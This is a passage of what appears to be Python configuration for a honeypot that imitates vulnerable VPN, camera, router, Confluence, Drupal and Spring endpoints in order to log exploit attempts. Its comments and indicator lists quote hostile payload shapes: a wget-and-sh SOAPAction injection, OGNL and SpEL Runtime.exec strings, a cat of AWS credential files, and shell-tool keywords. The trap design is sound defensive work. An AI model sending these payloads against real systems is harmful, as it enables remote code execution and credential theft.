    # Gateway / NetScaler ADC SSL VPN landing pages
    "/vpn/index.html",
    "/logon/logonpoint/index.html",
    # Language pack stub fetched by the Gateway login JS
    "/vpn/js/rdx/core/lang/rdx_en.json.gz",
    # Credential POST endpoints (real Citrix Gateway paths)
    "/cgi/login",
    "/p/u/doauthentication.do",
    # XenApp / StoreFront login (CVE-2022-27510 / CVE-2023-24486 bait)
    "/citrix/xenapp/auth/login.aspx",
])
CITRIX_GATEWAY_PATHS = {
    value.strip().lower()
    for value in (os.environ.get("HONEYPOT_CITRIX_GATEWAY_PATHS_CSV") or _CITRIX_GATEWAY_DEFAULT_PATHS).split(",")
    if value.strip()
}
# NetScaler firmware banner advertised in the HTML comment. 13.1.49.13 is
# in the CVE-2023-4966 (CitrixBleed) and CVE-2023-3519 vulnerable window
# so scanners deciding whether to ship the exploit body don't bail on a
# "patched" banner.
CITRIX_GATEWAY_VERSION = (os.environ.get("HONEYPOT_CITRIX_GATEWAY_VERSION") or "NS13.1: Build 49.13.nc").strip()

# --- Fake Microsoft RDWeb (RD Web Access) -------------------------------
# `/RDWeb/Pages/` and `/RDWeb/Pages/en-US/login.aspx` are the Remote
# Desktop Web Access landing + credential POST paths. Multi-target VPN
# scanners pair them with `/+CSCOE+/logon.html`, `/remote/login`, and
# `/global-protect/login.esp`. RDWeb is a frequent re-pivot for password
# spraying after AD-credential dumps and is a persistent target for
# multi-IP harvesters even though no single CVE drives the volume.
# Returning the RDWeb logon HTML lets the username + has-password fields
# land in the access log; the per-request `TSWAAuthHttpOnlyCookie` keeps
# session-replay attempts moving past the first POST.
RDWEB_ENABLED = _env_bool("HONEYPOT_RDWEB_ENABLED")
_RDWEB_DEFAULT_PATHS = ",".join([
    "/rdweb",
    "/rdweb/",
    "/rdweb/pages/",
    "/rdweb/pages/en-us/login.aspx",
    "/rdweb/pages/en-us/default.aspx",
])
RDWEB_PATHS = {
    value.strip().lower()
    for value in (os.environ.get("HONEYPOT_RDWEB_PATHS_CSV") or _RDWEB_DEFAULT_PATHS).split(",")
    if value.strip()
}
# Windows Server build advertised in the RDWeb logon HTML. 17763 is the
# Server 2019 LTSC build that scanners commonly fingerprint when picking
# password-spraying targets; matches the broad install base.
RDWEB_SERVER_BUILD = (os.environ.get("HONEYPOT_RDWEB_SERVER_BUILD") or "10.0.17763").strip()

# --- Fake Palo Alto GlobalProtect gateway (CVE-2024-3400 bait) ----------
# Multi-vendor VPN scanners probe `/global-protect/prelogin.esp` (with
# PAN GlobalProtect UA) and `/ssl-vpn/prelogin.esp` to fingerprint
# appliance mode (portal vs gateway). CVE-2024-3400 (CVSS 10.0,
# unauthenticated command injection in the GlobalProtect gateway,
# CISA KEV) targets the gateway path; returning a prelogin XML that
# claims gateway mode invites follow-on exploit attempts at
# `/api/v1/sessions` or SESSID cookie injection. Scanners also
# probe `/global-protect/login.esp` for the credential form.
GLOBALPROTECT_ENABLED = _env_bool("HONEYPOT_GLOBALPROTECT_ENABLED")
_GLOBALPROTECT_DEFAULT_PATHS = ",".join([
    "/global-protect/prelogin.esp",
    "/ssl-vpn/prelogin.esp",
    "/global-protect/login.esp",
    "/global-protect/getconfig.esp",
])
GLOBALPROTECT_PATHS = {
    value.strip().lower()
    for value in (os.environ.get("HONEYPOT_GLOBALPROTECT_PATHS_CSV") or _GLOBALPROTECT_DEFAULT_PATHS).split(",")
    if value.strip()
}
GLOBALPROTECT_VERSION = (os.environ.get("HONEYPOT_GLOBALPROTECT_VERSION") or "10.2.3").strip()

# --- Fake Sophos SSL VPN (XG Firewall user portal) ----------------------
# `/svpn/index.cgi` is the Sophos XG Firewall SSL VPN landing.
# Scanners check whether the VPN portal is enabled before attempting
# credential brute-force or CVE-2022-1040 (auth bypass, CVSS 9.8)
# exploit chains. Returning the portal login HTML invites credential
# submissions.
SOPHOS_VPN_ENABLED = _env_bool("HONEYPOT_SOPHOS_VPN_ENABLED")
_SOPHOS_VPN_DEFAULT_PATHS = ",".join([
    "/svpn/index.cgi",
    "/userportal/webpages/myaccount/login.jsp",
])
SOPHOS_VPN_PATHS = {
    value.strip().lower()
    for value in (os.environ.get("HONEYPOT_SOPHOS_VPN_PATHS_CSV") or _SOPHOS_VPN_DEFAULT_PATHS).split(",")
    if value.strip()
}

# --- Fake Barracuda SSL VPN (BSDI) --------------------------------------
# `/myvpn` with `sess=none&hdlc_framing=no&ipv4=1&ipv6=1` is the
# Barracuda SSL VPN tunnel-setup negotiation endpoint. Scanners probe
# this to discover Barracuda appliances for CVE-2023-7102 / CVE-2023-7101
# (Spreadsheet::ParseExcel RCE chain). Returning a plausible tunnel
# negotiation response keeps the probe alive.
BARRACUDA_VPN_ENABLED = _env_bool("HONEYPOT_BARRACUDA_VPN_ENABLED")
_BARRACUDA_VPN_DEFAULT_PATHS = ",".join([
    "/myvpn",
    "/cgi-mod/index.cgi",
])
BARRACUDA_VPN_PATHS = {
    value.strip().lower()
    for value in (os.environ.get("HONEYPOT_BARRACUDA_VPN_PATHS_CSV") or _BARRACUDA_VPN_DEFAULT_PATHS).split(",")
    if value.strip()
}

# --- Fake F5 BIG-IP APM (Access Policy Manager) -------------------------
# `/my.policy` is the F5 BIG-IP APM access policy landing — scanners
# probe it to fingerprint the BIG-IP web interface before checking for
# CVE-2023-46747 (auth bypass, CVSS 9.8) or CVE-2022-1388 (iControl
# REST RCE, CVSS 9.8). Also covers `/tmui/login.jsp` (the TMUI
# management console targeted by CVE-2020-5902) and
# `/sslvpnclient` (NetMotion/Zscaler client negotiation, often
# bundled by multi-vendor VPN scanners).
F5_BIGIP_ENABLED = _env_bool("HONEYPOT_F5_BIGIP_ENABLED")
_F5_BIGIP_DEFAULT_PATHS = ",".join([
    "/my.policy",
    "/tmui/login.jsp",
    "/tmui/login.jsp/..;/tmui/locallb/workspace/fileread.jsp",
    "/sslvpnclient",
])
F5_BIGIP_PATHS = {
    value.strip().lower()
    for value in (os.environ.get("HONEYPOT_F5_BIGIP_PATHS_CSV") or _F5_BIGIP_DEFAULT_PATHS).split(",")
    if value.strip()
}
F5_BIGIP_VERSION = (os.environ.get("HONEYPOT_F5_BIGIP_VERSION") or "16.1.3.1").strip()

# --- Fake Docker Registry V2 API ----------------------------------------
# `/v2/_catalog` is the Docker Distribution Registry HTTP API V2 endpoint
# that lists all repository names. Scanners probe it to discover exposed
# private registries for image enumeration, credential extraction from
# layer blobs, and malicious image push. The protocol is multi-step:
# `/v2/` (version check) -> `/v2/_catalog` (repo list) ->
# `/v2/<name>/tags/list` (tag enumeration) -> `/v2/<name>/manifests/<ref>`
# (image manifest) -> `/v2/<name>/blobs/<digest>` (layer download).
# Returning a plausible catalog with fake repo names invites follow-on
# enumeration. The `Docker-Distribution-Api-Version` header is the
# primary fingerprint real registries emit; scanners check for it.
DOCKER_REGISTRY_ENABLED = _env_bool("HONEYPOT_DOCKER_REGISTRY_ENABLED")
_DOCKER_REGISTRY_REPOS = [
    r.strip()
    for r in (os.environ.get("HONEYPOT_DOCKER_REGISTRY_REPOS_CSV")
              or "internal/api-gateway,internal/auth-service,deploy/worker,staging/web-app,backup/db-migrator").split(",")
    if r.strip()
]

# --- Fake Hikvision IP-camera ISAPI surface (CVE-2021-36260 bait) -------
# Long-running banner-grab probes consistently fetch a small set of
# ISAPI endpoints to identify Hikvision firmware before shipping a
# command-injection body in the language parameter (CVE-2021-36260,
# CVSS 9.8, unauthenticated). Real Hikvision firmware advertises its
# server as `App-webs/` and answers these paths with XML; returning
# plausibly-shaped XML keeps single-path scanners coming back daily
# and gives multi-step scanners somewhere to ship the exploit body.
HIKVISION_ENABLED = _env_bool("HONEYPOT_HIKVISION_ENABLED")
_HIKVISION_DEFAULT_PATHS = ",".join([
    # CVE-2021-36260 sink — language parameter command injection.
    "/sdk/weblanguage",
    # Common ISAPI banner-grab paths (no auth required, harvested before
    # exploit body is shipped).
    "/isapi/security/usercheck",
    "/isapi/system/deviceinfo",
])
HIKVISION_PATHS = {
    value.strip().lower()
    for value in (os.environ.get("HONEYPOT_HIKVISION_PATHS_CSV") or _HIKVISION_DEFAULT_PATHS).split(",")
    if value.strip()
}
# Firmware-style version embedded in the deviceInfo response. Picked from
# a release in the public-disclosure window for CVE-2021-36260 so scanners
# deciding whether to ship the exploit body don't bail on a "patched"
# banner.
HIKVISION_FIRMWARE_VERSION = (os.environ.get("HONEYPOT_HIKVISION_FIRMWARE_VERSION") or "V5.5.82 build 191205").strip()

# Shell-meta indicators flagged on body / query string for fast triage.
# CVE-2021-36260 ships the command inside <language>$(...)</language> or
# <language>`...`</language>; broader scanners also try ;, &&, ||, |, etc.
_HIKVISION_CMDI_INDICATORS = (
    "$(",
    "`",
    "&&",
    "||",
    ";",
    "|",
    "<language>",  # raw injection-shape body
    "wget ",
    "curl ",
    "/bin/sh",
    "bash -",
    "nc -",
)


def _hikvision_has_cmdi(query: str, body_preview: str) -> bool:
    haystack = f"{query} {body_preview}".lower()
    return any(needle in haystack for needle in _HIKVISION_CMDI_INDICATORS)


# --- Fake D-Link / Linksys HNAP1 router endpoint (CVE-2015-2051 bait) ----
# HNAP1 is the SOAP-over-HTTP control surface on a long tail of consumer
# routers (D-Link DIR-*, Linksys WRT-*, Zyxel home gateways). It lives at
# `/HNAP1` (root, no prefix) and accepts SOAP envelopes whose action URI
# is named in the `SOAPAction` request header. Two scanner families churn
# against this surface daily:
#
#   1. Mirai-style botnet workers shipping CVE-2015-2051 — command
#      injection where the SOAPAction header value is concatenated into
#      a shell command, e.g.
#        SOAPAction: "http://purenetworks.com/HNAP1/`wget http://x/y;sh`"
#      or
#        SOAPAction: "http://purenetworks.com/HNAP1/$(id)"
#      A bare 404 leaks "this isn't a router"; a plausible HNAP1 SOAP
#      response with a vendor banner keeps the payload coming.
#   2. Multi-target enterprise scanners that use `/HNAP1` as a router
#      fingerprint before deciding which CVE to ship next.
HNAP1_ENABLED = _env_bool("HONEYPOT_HNAP1_ENABLED")
_HNAP1_DEFAULT_PATHS = ",".join([
    "/hnap1",
    "/hnap1/",
])
HNAP1_PATHS = {
    value.strip().lower()
    for value in (os.environ.get("HONEYPOT_HNAP1_PATHS_CSV") or _HNAP1_DEFAULT_PATHS).split(",")
    if value.strip()
}
HNAP1_VENDOR = (os.environ.get("HONEYPOT_HNAP1_VENDOR") or "D-Link").strip()
HNAP1_MODEL = (os.environ.get("HONEYPOT_HNAP1_MODEL") or "DIR-825").strip()
# Firmware string in the disclosure window for CVE-2015-2051 / CVE-2019-6977
# so scanners gating exploit delivery on a "vulnerable" banner don't bail.
HNAP1_FIRMWARE_VERSION = (os.environ.get("HONEYPOT_HNAP1_FIRMWARE_VERSION") or "2.10NA").strip()

# Shell-meta indicators flagged on the SOAPAction header / body / query.
# CVE-2015-2051 ships the command directly inside the SOAPAction value
# after the `/HNAP1/` segment, so backticks / $(/&&/;) in the header are
# the highest-signal flag. Body indicators catch the wider Mirai dropper
# repertoire (wget piped to sh, etc.).
_HNAP1_CMDI_INDICATORS = (
    "$(",
    "`",
    "&&",
    "||",
    ";",
    "|",
    "wget ",
    "curl ",
    "/bin/sh",
    "tftp ",
    "busybox",
)


def _hnap1_has_cmdi(soap_action: str, query: str, body_preview: str) -> bool:
    haystack = f"{soap_action} {query} {body_preview}".lower()
    return any(needle in haystack for needle in _HNAP1_CMDI_INDICATORS)


# --- Fake GeoServer admin / OGC endpoints (CVE-2024-36401 bait) ----------
# Two scanner families are observed probing this surface:
#   1. Banner-grab fleets fetching /geoserver/, /geoserver/web/, /geoserver/index.html
#   2. Enterprise multi-target scanners hitting /geoserver/web/wicket/
#      bookmarkable/org.geoserver.web.AboutGeoServerPage — the surface where
#      CVE-2024-36401 (OGC Filter property-name evaluation -> RCE) lands.
# Plus the OGC service endpoints (/ows, /wfs, /wms, /wcs, /wps) where the
# same CVE is also reachable via crafted &evaluateProperty / &valueReference
# parameters. Returning plausible HTML/XML keeps the probe alive past the
# fingerprint stage so we capture the follow-on payload bodies.
GEOSERVER_ENABLED = _env_bool("HONEYPOT_GEOSERVER_ENABLED")
# Reported version shown in the landing page + GetCapabilities. Pinned to a
# version that is in-window for the OGC Filter CVE so scanners deciding
# whether to ship the exploit body don't bail on a "patched" banner. Override
# via env if a future deployment wants to advertise a different release.
GEOSERVER_VERSION = (os.environ.get("HONEYPOT_GEOSERVER_VERSION") or "2.25.1").strip()

# --- Fake ColdFusion admin / component browser ---------------------------
# Enterprise-multi-scanner added ColdFusion-shaped paths in April 2026:
# `/indice.cfm`, `/menu.cfm`, `/base.cfm`, and `/CFIDE/componentutils/`.
# Return plausible ColdFusion pages and log query/body payload indicators so
# follow-on CVE probes are separable from plain enumeration.
COLDFUSION_ENABLED = _env_bool("HONEYPOT_COLDFUSION_ENABLED")
_COLDFUSION_DEFAULT_PATHS = ",".join([
    "/indice.cfm",
    "/menu.cfm",
    "/base.cfm",
    "/cfide/componentutils",
    "/cfide/componentutils/",
    "/cfide/administrator/index.cfm",
    "/cfide/adminapi/administrator.cfc",
])
COLDFUSION_PATHS = {
    value.strip().lower()
    for value in (os.environ.get("HONEYPOT_COLDFUSION_PATHS_CSV") or _COLDFUSION_DEFAULT_PATHS).split(",")
    if value.strip()
}
COLDFUSION_VERSION = (os.environ.get("HONEYPOT_COLDFUSION_VERSION") or "2021.0.05").strip()

# --- Fake Atlassian Confluence (CVE-2022-26134 OGNL RCE bait) ------------
# Active scanners send URL-encoded OGNL Runtime.exec() payloads in the
# request path itself (the canonical CVE-2022-26134 shape) and follow
# up against `pages/createpage-entervariables.action`,
# `pages/doenterpagevariables.action`, `templates/editor-preload-container`,
# and `users/user-dark-features` under bare, `/confluence/`, and `/wiki/`
# prefixes. The exploit body typically embeds an out-of-band callback
# domain (Interactsh / OAST.me / DNSlog family) that we lift from the
# payload — the same callback hostname recurring across sensors is a
# durable attribution signal regardless of source IP rotation.
CONFLUENCE_ENABLED = _env_bool("HONEYPOT_CONFLUENCE_ENABLED")
_CONFLUENCE_DEFAULT_PATHS = ",".join([
    # Core CVE-2022-26134 sinks.
    "/pages/createpage-entervariables.action",
    "/confluence/pages/createpage-entervariables.action",
    "/wiki/pages/createpage-entervariables.action",
    "/pages/doenterpagevariables.action",
    "/confluence/pages/doenterpagevariables.action",
    "/wiki/pages/doenterpagevariables.action",
    # Pre-exploit fingerprint paths under each common deployment prefix.
    "/templates/editor-preload-container",
    "/confluence/templates/editor-preload-container",
    "/wiki/templates/editor-preload-container",
    "/users/user-dark-features",
    "/confluence/users/user-dark-features",
    "/wiki/users/user-dark-features",
    # Login surface — a real login.action makes the trap look like a
    # production Confluence install on first contact.
    "/login.action",
    "/confluence/login.action",
    "/wiki/login.action",
])
CONFLUENCE_PATHS = {
    value.strip().lower()
    for value in (os.environ.get("HONEYPOT_CONFLUENCE_PATHS_CSV") or _CONFLUENCE_DEFAULT_PATHS).split(",")
    if value.strip()
}
# Pinned to a build in the public-disclosure window for CVE-2022-26134
# so scanners deciding whether to ship the exploit body don't bail on a
# patched banner.
CONFLUENCE_VERSION = (os.environ.get("HONEYPOT_CONFLUENCE_VERSION") or "7.18.1").strip()

# OGNL-injection indicators. The canonical CVE-2022-26134 path embeds
# `${@java.lang.Runtime@getRuntime().exec("...")}` URL-encoded as
# `%24%7B%40...%7D`. Real Confluence traffic never contains these.
_CONFLUENCE_OGNL_INDICATORS = (
    "${@",            # raw OGNL
    "%24%7b%40",      # URL-encoded OGNL (case-insensitive, normalised)
    "@java.lang.runtime",
    "getruntime()",
    "ognl.runtime",
    ".getmethods(",
    ".getsuperclass(",
)


def _confluence_has_ognl(path: str, query: str, body_preview: str) -> bool:
    haystack = f"{path} {query} {body_preview}".lower()
    return any(needle in haystack for needle in _CONFLUENCE_OGNL_INDICATORS)


# --- Fake SAP NetWeaver Visual Composer MetadataUploader ---------------
# `/developmentserver/metadatauploader` is the Visual Composer endpoint
# scanners walk to fingerprint SAP NetWeaver Application Server Java and
# (per the public CVE-2025-31324 disclosure window) drop a JSP webshell
# via unauthenticated multipart upload. Sister CVE-2017-9844 (XXE in the
# same servlet path) and CVE-2020-6287 (RECON) probes hit the same prefix.
# Real NetWeaver returns a small WebDynpro / SAP-formatted error envelope
# on bare GET and a "200 OK" plaintext receipt on successful POST upload;
# returning a plausible response on both keeps scanners from bailing on
# fingerprint and captures the upload payload (filename, content-type,
# embedded JSP / xpath / cmd indicators) for triage.
SAP_METADATAUPLOADER_ENABLED = _env_bool("HONEYPOT_SAP_METADATAUPLOADER_ENABLED")
# Body decode cap mirrors the file-upload trap — keeps log rows compact
# while still surfacing enough payload for the JSP / XXE / cmd-injection
# indicator flags.
SAP_METADATAUPLOADER_BODY_DECODE_LIMIT = max(
    int((os.environ.get("HONEYPOT_SAP_METADATAUPLOADER_BODY_DECODE_LIMIT") or "8192").strip() or "8192"),
    512,
)
# JSP / shell payload indicators on the multipart body — flips
# `sapMetadataUploaderHasJspShell` for fast triage. Matched on the raw
# request bytes (case-insensitive); the body itself is still hashed and
# previewed in `bodyPreview` regardless.
_SAP_METADATAUPLOADER_SHELL_INDICATORS = (
    b"<%@",                           # JSP page directive
    b"<jsp:",                         # JSP action tag
    b"runtime.getruntime",            # java.lang.Runtime.exec()
    b"processbuilder",                # alt RCE pivot
    b"java.lang.runtime",
    b"shell_exec",
    b"<?php",                         # mistargeted PHP shell — still log
    b"<?xml",                         # XXE / CVE-2017-9844 shape
)
# XXE indicators on the body — XML external entity declarations land here
# on CVE-2017-9844 probes. Separate flag so triage can sort JSP-shell
# uploads from XML-injection probes.
_SAP_METADATAUPLOADER_XXE_INDICATORS = (
    b"<!doctype",
    b"<!entity",
    b"system \"",
    b"system '",
)


# --- Fake Drupal user-registration / settings.php trap (Drupalgeddon2) ---
# Two probe families against the Drupal 8/9 attack surface:
#
#   1. `/user/register?element_parents=account/mail/%23value&ajax_form=1
#      &_wrapper_format=drupal_ajax` — the CVE-2018-7600 ("Drupalgeddon2")
#      unauthenticated-RCE shape. A real Drupal endpoint that accepts the
#      AJAX form upload renders an HTML+JSON response; we mimic the GET
#      registration form, accept the POST, and log the full
#      `element_parents` / `mail[#post_render]` chain so the OGNL-style
#      PHP-render payload lands in the access log.
#
#   2. `/sites/default/settings.php` (+ `.bak` / `.swp` / `~` / `%00` /
#      `%20` / `default.settings.php`) — sloppy-deploy harvest of the
#      Drupal config file with plaintext DB creds + S3 backup creds.
#      A real `settings.php` carries `$databases['default']['default']`
#      arrays plus the `$settings['hash_salt']` line scanners grep for;
#      we ship the same shape with a per-hit DB password and a Tracebit
#      AWS canary in the S3-backup comment block.
DRUPAL_ENABLED = _env_bool("HONEYPOT_DRUPAL_ENABLED")
DRUPAL_VERSION = (os.environ.get("HONEYPOT_DRUPAL_VERSION") or "9.5.11").strip()
DRUPAL_BODY_DECODE_LIMIT = max(
    int((os.environ.get("HONEYPOT_DRUPAL_BODY_DECODE_LIMIT") or "8192").strip() or "8192"),
    512,
)
# CVE-2018-7600 ("Drupalgeddon2") payload indicators. Real exploits POST a
# form-encoded body with `mail[#post_render][]=passthru` or
# `mail[#markup]=<cmd>` plus an `element_parents=account/mail/%23value` /
# `ajax_form=1` / `_wrapper_format=drupal_ajax` query string. Match on
# the raw bytes (case-insensitive) — flips `drupalHasDrupalgeddon2`.
_DRUPAL_DRUPALGEDDON2_INDICATORS = (
    b"#post_render",
    b"#markup",
    b"#type",
    b"#lazy_builder",
    b"#pre_render",
    b"element_parents=",
    b"_wrapper_format=drupal_ajax",
    b"ajax_form=1",
)
# Generic shell-command-execution indicators inside the payload —
# distinct from the Drupalgeddon2 shape so triage can sort "Drupal probe"
# (fingerprint only) from "actual RCE attempt". Many CVE-2018-7600 bodies
# embed these as the `#post_render` callback target.
_DRUPAL_RCE_PAYLOAD_INDICATORS = (
    b"passthru",
    b"system(",
    b"exec(",
    b"shell_exec",
    b"phpinfo",
    b"file_get_contents",
    b"file_put_contents",
    b"base64_decode",
    b"assert(",
    b"eval(",
)


# --- Fake Spring Cloud Gateway Actuator extension (CVE-2022-22947) -------
# `/actuator/gateway/routes` is the route-management surface for Spring
# Cloud Gateway 3.0.x / 3.1.0. CVE-2022-22947 (Spring4Shell-adjacent) is
# the SpEL-injection chain through this endpoint:
#
#   POST /actuator/gateway/routes/{id}  — register a malicious route
#       whose filter args contain `#{T(java.lang.Runtime).getRuntime()
#       .exec("id")}`; the SpEL fires when the gateway compiles the
#       filter.
#   POST /actuator/gateway/refresh      — force the route table to
#       reload (triggers the SpEL evaluation if it hasn't fired).
#   GET  /actuator/gateway/routes/{id}  — read back the route, which
#       echoes the command output to the scanner.
#   DELETE /actuator/gateway/routes/{id} — clean-up after exploitation.
#
# Flux mimics all four endpoints: GET lists return a small fake route
# table with an embedded AWS canary in the `metadata.adminApiKey`
# slot; POST captures the SpEL body and returns 201 Created; DELETE
# / refresh return 200 OK. The handler flips
# `springGatewayHasSpel` whenever the body or query contains
# `#{` / `T(` / `getRuntime` / `ProcessBuilder` indicators.
SPRING_GATEWAY_ENABLED = _env_bool("HONEYPOT_SPRING_GATEWAY_ENABLED")
SPRING_GATEWAY_BODY_DECODE_LIMIT = max(
    int((os.environ.get("HONEYPOT_SPRING_GATEWAY_BODY_DECODE_LIMIT") or "8192").strip() or "8192"),
    512,
)
# SpEL / Java-reflection indicators on the body or query — flips
# `springGatewayHasSpel` for fast triage. Real CVE-2022-22947 payloads
# always include at least `#{T(` or `T(java.lang.Runtime)`; we match on
# the broader set to catch obfuscation variants and follow-on probes.
_SPRING_GATEWAY_SPEL_INDICATORS = (
    b"#{",
    b"${",
    b"t(java.lang",
    b"t(java.io",
    b"t(java.util",
    b"getruntime",
    b"processbuilder",
    b"runtime.exec",
    b"reflectiveoperation",
    b"new java.",
)


# --- Fake Next.js application + SSJS-injection probe responder ----------
# Probes seen in the wild send a base64-encoded JS payload via `?cmd=...`
# against Next.js conventional routes. The decoded body is an
# IIFE that calls `require('child_process').execSync(cmd)` inside a
# try/catch — a classic server-side-JavaScript-injection (SSJS) test.
# A bare 404 leaks "this isn't Next.js"; emitting a plausible page-data
# JSON keeps the scanner alive past the fingerprint stage and a careful
# echo simulation invites a real exploitation follow-up that we capture
# in the next request.
NEXTJS_ENABLED = _env_bool("HONEYPOT_NEXTJS_ENABLED")
_NEXTJS_DEFAULT_PATHS = ",".join([
    "/api/endpoint",
    "/api/test",
    # Literal `[[...slug]]` is the catch-all-route declaration shape;
    # scanners targeting Next.js sometimes probe the literal form.
    "/api/[[...slug]]",
    # Ubiquiti UniFi controllers also expose `/api/v2/about`; Next.js
    # is the more common host of that path in the wild, so route it
    # here for now (low FP risk — no other handler claims it).
    "/api/v2/about",
])
NEXTJS_PATHS = {
    value.strip().lower()
    for value in (os.environ.get("HONEYPOT_NEXTJS_PATHS_CSV") or _NEXTJS_DEFAULT_PATHS).split(",")
    if value.strip()
}
# Path prefixes that route to the trap. `_next/data/<buildId>/*.json` is
# Next.js's ISR data endpoint; `_next/static/chunks/pages/...` is the
# build-output JS chunk path. Both are characteristic enough that hits
# only come from Next.js-aware scanners. We deliberately do NOT match
# `/api/` as a prefix — too generic, and the observable probes use a
# small set of Next.js-conventional `/api/*` paths covered above.
_NEXTJS_PATH_PREFIXES = ("/_next/data/", "/_next/static/chunks/pages/")
NEXTJS_BODY_DECODE_LIMIT = max(int((os.environ.get("HONEYPOT_NEXTJS_BODY_DECODE_LIMIT") or "8192").strip() or "8192"), 512)

# SSJS-injection indicators inside the decoded `cmd=` payload (or raw
# body). A real Next.js endpoint never sees these strings.
_NEXTJS_SSJS_INDICATORS = (
    "child_process",
    # Observed verbatim in a probe (note: `child-process` with a hyphen
    # is not a real Node module, so the scanner's payload would always
    # `catch` and return its sentinel string — a fingerprint of the
    # probe itself, not a real exploit.)
    "child-process",
    "execsync",
    "require(",
    "(function()",
    "function () {",
    "process.env",
    "global.process",
    "globalthis",
)

# Extracts the literal `var cmd = "..."` / `var cmd = '...'` from the
# decoded JS so the trap can reflect the operator's own probe-marker
# string (`echo VULN_TEST` etc.) back to them.
_NEXTJS_CMD_LITERAL_RE = re.compile(
    r"""var\s+cmd\s*=\s*['"]([^'"]{0,512})['"]""",
    re.IGNORECASE,
)


def _nextjs_decode_cmd_param(query: str) -> str:
    """Extract the `cmd=` query value and base64-decode it. Returns the
    decoded string, or "" if the param is absent / undecodable / too
    large. Tolerant of URL-safe base64 and missing padding."""
    if not query:
        return ""
    try:
        params = parse_qs(query, keep_blank_values=True)
    except Exception:  # pragma: no cover — parse_qs is permissive
        return ""
    raw = ""
    for key in ("cmd", "command", "exec"):
        values = params.get(key)
        if values:
            raw = values[0]
            break
    if not raw or len(raw) > NEXTJS_BODY_DECODE_LIMIT:
        return ""
    # Try base64 first (the observed shape); fall back to the raw value
    # so plaintext probes (?cmd=id) still get logged.
    candidate = raw.replace("-", "+").replace("_", "/")
    candidate += "=" * (-len(candidate) % 4)
    try:
        decoded = base64.b64decode(candidate, validate=False)
    except Exception:
        return raw[:NEXTJS_BODY_DECODE_LIMIT]
    try:
        text = decoded.decode("utf-8")
    except UnicodeDecodeError:
        return raw[:NEXTJS_BODY_DECODE_LIMIT]
    return text[:NEXTJS_BODY_DECODE_LIMIT] if text.strip() else raw[:NEXTJS_BODY_DECODE_LIMIT]


def _nextjs_has_ssjs(decoded_payload: str) -> bool:
    if not decoded_payload:
        return False
    haystack = decoded_payload.lower()
    return any(needle in haystack for needle in _NEXTJS_SSJS_INDICATORS)


def _nextjs_extract_cmd_literal(decoded_payload: str) -> str:
    """Return the inner `var cmd = "..."` literal, or "" if absent."""
    if not decoded_payload:
        return ""
    match = _NEXTJS_CMD_LITERAL_RE.search(decoded_payload)
    return match.group(1) if match else ""


def _nextjs_simulate_command(cmd_literal: str) -> str:
    """Mimic the output of trivial `echo` probes so a follow-up
    exploitation payload is more likely to be sent. Anything other than
    a literal `echo <safe-token>` falls back to the same sentinel string
    the scanner's own catch-block returns ("ERROR") — that keeps the
    response surface small and looks like a partial-eval failure
    instead of a working RCE for unrecognised commands."""
    text = cmd_literal.strip()
    if not text:
        return "ERROR"
    if text.lower().startswith("echo "):
        body = text[5:].strip().strip('"\'')
        # Reject anything but printable ASCII; we don't want to reflect
        # arbitrary attacker bytes back even into a log row.
        if re.fullmatch(r"[\w\-.: /]{0,256}", body):
            return f"{body}\n"
    return "ERROR"


# OAST / Interactsh / DNSlog-family hostnames seen in OOB callback
# payloads. Anchored on `.<domain>` so partial matches like
# `notoast.me.example.com` don't trigger a false positive.
_OAST_DOMAINS = (
    "oast.me",
    "oast.fun",
    "oast.live",
    "oast.online",
    "oast.pro",
    "oast.site",
    "interact.sh",
    "interactsh.com",
    "burpcollaborator.net",
    "dnslog.cn",
    "ceye.io",
    "requestbin.net",
    "pipedream.net",
)
_OAST_HOST_RE = re.compile(
    r"([a-z0-9][a-z0-9.\-]{0,253}\.(?:"
    + "|".join(re.escape(d) for d in _OAST_DOMAINS)
    + r"))",
    re.IGNORECASE,
)


def _extract_oast_callback(text: str) -> str:
    """Return the first OAST-family hostname found in the (possibly
    URL-encoded) text, or '' if none. Decodes percent-encoding once
    because real-world payloads are typically URL-encoded inside the
    request path."""
    if not text:
        return ""
    try:
        decoded = unquote(text)
    except (UnicodeDecodeError, ValueError):
        decoded = text
    haystack = f"{decoded} {text}".lower()
    match = _OAST_HOST_RE.search(haystack)
    return match.group(1) if match else ""


# --- Fake command-injection / env-leak responder -------------------------
# Two distinct shapes routed through one handler:
#
#   /admin/config?cmd=... and /admin/config.php?cmd=... — generic
#       "exposed admin endpoint that runs a shell command from cmd="
#       pattern. Scanners enumerate
#       this against admin/config/router/router-config etc. We extract the
#       cmd value, classify it, and return plausible output. Crucially, when
#       the cmd asks for a credential file (cat /root/.aws/credentials and
#       friends) we mint a Tracebit AWS canary and return it as the "leaked"
#       file contents — turning the probe into a credential-replay trap.
#
#   /printenv, /cgi-bin/printenv, /cgi-bin/test-cgi — Apache demo CGI scripts
#       that print the runtime environment. Enabled-by-default on misconfigured
#       boxes since the 1990s and still hunted because the env block tends to
#       carry AWS_*, DATABASE_URL, etc. We always 200 here with a fake env
#       block whose AWS_* values are a Tracebit canary; per-IP cache bounds
#       quota burn (one canary per source per cache TTL).
#
# Default-on; no env var per-trap to disable. Per-IP cache caps Tracebit
# spend the same way fake-git does.
CMD_INJECTION_ENABLED = _env_bool("HONEYPOT_CMD_INJECTION_ENABLED")
_CMD_INJECTION_DEFAULT_PATHS = ",".join([
    "/admin/config",
    "/admin/config.php",
    "/printenv",
    "/cgi-bin/printenv",
    "/cgi-bin/test-cgi",
])
CMD_INJECTION_PATHS = {
    value.strip().lower()
    for value in (os.environ.get("HONEYPOT_CMD_INJECTION_PATHS_CSV") or _CMD_INJECTION_DEFAULT_PATHS).split(",")
    if value.strip()
}
# Param names commonly used to smuggle the command in cmd-injection probes.
# Distinct from the webshell list because that one is biased toward PHP
# webshells (`c`, `pass`, `key`); cmd-injection probes against admin-config
# endpoints overwhelmingly use `cmd` itself, with `command` and `exec` as
# minor variants.
CMD_INJECTION_COMMAND_KEYS = ("cmd", "command", "exec", "c")


# Fake OpenAPI / Swagger spec responder. Scanners enumerate a large set of
# canonical SpringDoc / FastAPI / Swashbuckle / drf-yasg / NSwag locations
# looking for an unauth OpenAPI spec; a real spec leaks endpoint inventory,
# auth schemes, and any developer-stamped example credentials. We return a
# plausible OpenAPI 3.0 document whose `securitySchemes` examples and
# `servers[].variables` defaults carry a per-request Tracebit AWS canary
# so a scraper that extracts dev-staging creds and replays them fires
# Tracebit. UI bootstrap paths (`/swagger-ui.html`, `/redoc`, …) return a
# stub HTML page that points at the JSON spec so the second probe lands.
OPENAPI_SWAGGER_ENABLED = _env_bool("HONEYPOT_OPENAPI_SWAGGER_ENABLED")
